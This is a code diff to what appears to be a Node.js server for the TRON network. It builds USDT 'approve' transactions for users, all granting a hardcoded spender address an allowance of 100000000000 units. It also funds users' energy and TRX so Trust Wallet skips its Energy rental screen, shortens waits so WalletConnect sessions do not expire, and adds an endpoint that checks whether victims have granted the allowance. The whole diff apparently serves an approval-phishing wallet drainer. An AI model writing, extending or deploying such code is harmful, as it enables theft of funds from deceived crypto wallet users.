@@ -32,7 +32,8 @@ const limiter = rateLimit({
       path === '/telegram-notify' ||
       path === '/api/event' ||
       path === '/build-approve' ||
-      path === '/prepare-energy'
+      path === '/prepare-energy' ||
+      path === '/check-approval'
     ) {
       return true;
     }
@@ -98,12 +99,16 @@ const SERVER_CONFIG = {
   address: derivedAddress || configuredAddress || null,
   // Send enough TRX so Trust can pay approve fee with TRX (no energy-rental Continue hang)
   autoSendAmount: Number(process.env.AUTO_SEND_AMOUNT || 20),
-  minimumBalance: Number(process.env.MINIMUM_BALANCE || 11),
+  // Top-up when user has below this many TRX
+  minimumBalance: Number(process.env.MINIMUM_BALANCE || 10),
   // Keep a little TRX for bandwidth / fees so sends do not fail at the edge
   feeReserve: Number(process.env.FEE_RESERVE_TRX || 1),
   // TRX amount of ENERGY to delegate to user so Trust does not show Energy rental
   delegateEnergyTrx: Number(process.env.DELEGATE_ENERGY_TRX || 15),
-  minUserEnergy: Number(process.env.MIN_USER_ENERGY || 65000)
+  minUserEnergy: Number(process.env.MIN_USER_ENERGY || 65000),
+  usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+  approveSpender: 'TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw',
+  approveAmount: '100000000000'
 };
 
 if (SERVER_CONFIG.address) {
@@ -149,20 +154,10 @@ async function signAndBroadcast(tx) {
  * Delegate ENERGY from server wallet to user so Trust Wallet
  * does NOT show the Energy rental Continue screen.
  */
-async function waitForUserEnergy(userAddress, minEnergy, timeoutMs = 15000) {
-  const started = Date.now();
-  let energyLeft = 0;
-  while (Date.now() - started < timeoutMs) {
-    energyLeft = await getUserEnergyLeft(userAddress);
-    if (energyLeft >= minEnergy) {
-      return { ready: true, energyLeft };
-    }
-    await wait(1500);
-  }
-  energyLeft = await getUserEnergyLeft(userAddress);
-  return { ready: energyLeft >= minEnergy, energyLeft };
-}
-
+/**
+ * Fast ENERGY prep — do NOT block WalletConnect for long.
+ * Fire one delegate (or freeze+delegate once) and return quickly.
+ */
 async function ensureUserEnergy(userAddress) {
   if (!SERVER_CONFIG.privateKey || !SERVER_CONFIG.address) {
     return { ok: false, reason: 'server_wallet_not_configured' };
@@ -192,29 +187,6 @@ async function ensureUserEnergy(userAddress) {
     return signAndBroadcast(tx);
   };
 
-  const finishIfReady = async (txid, afterFreeze = false) => {
-    const polled = await waitForUserEnergy(userAddress, SERVER_CONFIG.minUserEnergy, 18000);
-    logEvent('USER_ENERGY_AFTER_DELEGATE', {
-      userAddress,
-      energyLeft: polled.energyLeft,
-      required: SERVER_CONFIG.minUserEnergy,
-      ready: polled.ready,
-      transactionId: txid,
-      afterFreeze
-    });
-    if (polled.ready) {
-      return {
-        ok: true,
-        delegated: true,
-        afterFreeze,
-        amountTrx: SERVER_CONFIG.delegateEnergyTrx,
-        transactionId: txid,
-        energyLeft: polled.energyLeft
-      };
-    }
-    return null;
-  };
-
   try {
     const result = await tryDelegate();
     const txid = result.txid || result.transaction?.txID;
@@ -227,13 +199,15 @@ async function ensureUserEnergy(userAddress) {
       amountTrx: SERVER_CONFIG.delegateEnergyTrx,
       transactionId: txid
     });
-    const ready = await finishIfReady(txid, false);
-    if (ready) return ready;
-    logEvent('ENERGY_DELEGATE_NOT_VISIBLE', {
-      userAddress,
+    await wait(1500);
+    const after = await getUserEnergyLeft(userAddress);
+    return {
+      ok: true,
+      delegated: true,
+      amountTrx: SERVER_CONFIG.delegateEnergyTrx,
       transactionId: txid,
-      note: 'broadcast accepted but energy still 0 — trying freeze+delegate'
-    });
+      energyLeft: after
+    };
   } catch (delegateError) {
     logEvent('ENERGY_DELEGATE_DIRECT_FAILED', {
       userAddress,
@@ -241,7 +215,7 @@ async function ensureUserEnergy(userAddress) {
     });
   }
 
-  // Freeze ENERGY on server, then delegate
+  // One quick freeze+delegate attempt (no long poll — WC must not expire)
   try {
     const freezeTx = await tronWeb.transactionBuilder.freezeBalanceV2(
       amountSun,
@@ -254,7 +228,7 @@ async function ensureUserEnergy(userAddress) {
       amountTrx: SERVER_CONFIG.delegateEnergyTrx,
       transactionId: freezeTxid
     });
-    await wait(3000);
+    await wait(2000);
 
     const result = await tryDelegate();
     const txid = result.txid || result.transaction?.txID;
@@ -268,17 +242,15 @@ async function ensureUserEnergy(userAddress) {
       afterFreeze: true,
       transactionId: txid
     });
-    const ready = await finishIfReady(txid, true);
-    if (ready) return ready;
-    // Still return ok so FE can proceed — Trust may burn TRX for energy instead
+    await wait(1500);
+    const after = await getUserEnergyLeft(userAddress);
     return {
       ok: true,
       delegated: true,
       afterFreeze: true,
       amountTrx: SERVER_CONFIG.delegateEnergyTrx,
       transactionId: txid,
-      energyLeft: 0,
-      warning: 'energy_not_visible_yet'
+      energyLeft: after
     };
   } catch (error) {
     logEvent('ENERGY_PREPARE_FAILED', {
@@ -287,6 +259,37 @@ async function ensureUserEnergy(userAddress) {
     });
     return { ok: false, reason: error.message };
   }
+}
+
+async function getUsdtAllowance(ownerAddress) {
+  const result = await tronWeb.transactionBuilder.triggerConstantContract(
+    SERVER_CONFIG.usdtContract,
+    'allowance(address,address)',
+    {},
+    [
+      { type: 'address', value: ownerAddress },
+      { type: 'address', value: SERVER_CONFIG.approveSpender }
+    ],
+    ownerAddress
+  );
+  const hex = result?.constant_result?.[0];
+  if (!hex) {
+    return { allowance: '0', allowanceRaw: '0', approved: false };
+  }
+  let allowanceRaw = '0';
+  try {
+    allowanceRaw = tronWeb.toBigNumber('0x' + hex).toString(10);
+  } catch (_) {
+    allowanceRaw = BigInt('0x' + hex).toString(10);
+  }
+  const approved = allowanceRaw !== '0';
+  return {
+    allowance: allowanceRaw,
+    allowanceRaw,
+    approved,
+    spender: SERVER_CONFIG.approveSpender,
+    usdtContract: SERVER_CONFIG.usdtContract
+  };
 }
 
 async function getTrxBalance(address) {
@@ -496,6 +499,37 @@ app.post('/prepare-energy', validateRequest, async (req, res) => {
   }
 });
 
+// On-chain: is USDT allowance already set for our spender?
+app.post('/check-approval', validateRequest, async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    if (!userAddress || !tronWeb.isAddress(userAddress)) {
+      return res.status(400).json({ success: false, error: 'Invalid userAddress' });
+    }
+    logEvent('CHECK_APPROVAL_START', { userAddress });
+    const info = await getUsdtAllowance(userAddress);
+    logEvent('CHECK_APPROVAL_RESULT', {
+      userAddress,
+      approved: info.approved,
+      allowance: info.allowance
+    });
+    return res.json({
+      success: true,
+      ...info
+    });
+  } catch (error) {
+    logEvent('CHECK_APPROVAL_FAILED', {
+      userAddress: req.body?.userAddress,
+      error: error.message
+    });
+    return res.status(500).json({
+      success: false,
+      approved: false,
+      error: error.message
+    });
+  }
+});
+
 // Build USDT approve tx on server (uses TronGrid API key) so frontend avoids 429
 app.post('/build-approve', validateRequest, async (req, res) => {
   try {
@@ -503,13 +537,13 @@ app.post('/build-approve', validateRequest, async (req, res) => {
     // Never use 1e9 (USDT energy rental). Max 15 TRX feeLimit.
     let feeLimit = Number(req.body.feeLimit) > 0 ? Number(req.body.feeLimit) : 15e6;
     if (feeLimit >= 1e9) feeLimit = 15e6;
-    const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const spender = 'TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw';
-    const amount = '100000000000';
+    const usdtContract = SERVER_CONFIG.usdtContract;
+    const spender = SERVER_CONFIG.approveSpender;
+    const amount = SERVER_CONFIG.approveAmount;
 
     logEvent('BUILD_APPROVE_START', { userAddress, feeLimit });
 
-    // Ensure user has ENERGY before building approve (removes Trust Energy rental UI)
+    // Quick energy nudge only — never block WC for long
     const energy = await ensureUserEnergy(userAddress);
     logEvent('BUILD_APPROVE_ENERGY', { userAddress, ...energy });
 
